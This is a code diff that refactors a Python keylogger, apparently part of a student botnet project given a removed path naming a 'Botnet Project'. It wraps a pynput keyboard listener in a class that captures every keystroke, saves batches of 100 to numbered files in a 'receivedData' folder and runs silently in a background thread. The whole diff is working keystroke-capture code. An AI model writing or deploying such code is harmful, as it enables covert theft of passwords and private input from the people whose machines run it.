@@ -1,41 +1,49 @@
 import os
+import threading
 from pynput import keyboard
-import datetime
 
-def get_key_name(key):
-    if isinstance(key, keyboard.KeyCode):
-        return key.char
-    else:
-        return str(key)
+class Keylogger:
+    def __init__(self):
+        self.count = 0
+        self.keys = []
+        self.keyloggerNumber = 0
 
-count = 0
-keys = []
+    def get_key_name(self, key):
+        if isinstance(key, keyboard.KeyCode):
+            return key.char
+        else:
+            return str(key)
 
-def on_press(key):
-    global keys, count
-    key_name = get_key_name(key)
-    keys.append(key_name)
-    count += 1
-    if count >= 10:
-        count = 0
-        write_file(keys)
-        keys = []
+    def on_press(self, key):
+        key_name = self.get_key_name(key)
+        self.keys.append(key_name)
+        self.count += 1
+        if self.count >= 100:
+            self.count = 0
+            self.write_file()
 
-def write_file(keys):
-    filename = f"keylogs_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
-    with open(os.path.join(r"D:\Air University\Botnet Project\static\receivedData\keylogs", filename), "a") as f:
-        for key in keys:
-            if key is not None:
-                f.write(str(key) + " ")
+    def write_file(self):
+        filename = f"keylogs_{self.keyloggerNumber}.txt"
+        filepath = os.path.join("./static/receivedData/keylogs/", filename)
+        with open(filepath, 'w') as f:
+            for key in self.keys:
+                f.write(str(key) + ' ')
+        tmp = f"/static/receivedData/keylogs/{filename}"
+        self.keyloggerNumber += 1
 
-def on_release(key):
-    pass
+    def start_keylogger(self):
+        with keyboard.Listener(
+                on_press=self.on_press,
+                on_release=self.on_release) as listener:
+            listener.join()
 
-def startKeylogger():
-    with keyboard.Listener(
-            on_press=on_press,
-            on_release=on_release) as listener:
-        listener.join()
+    def on_release(self, key):
+        pass
+
+def start_keylogger():
+    keylogger_instance = Keylogger()
+    keylogger_thread = threading.Thread(target=keylogger_instance.start_keylogger)
+    keylogger_thread.start()
 
 if __name__ == "__main__":
-    startKeylogger()
+    start_keylogger()
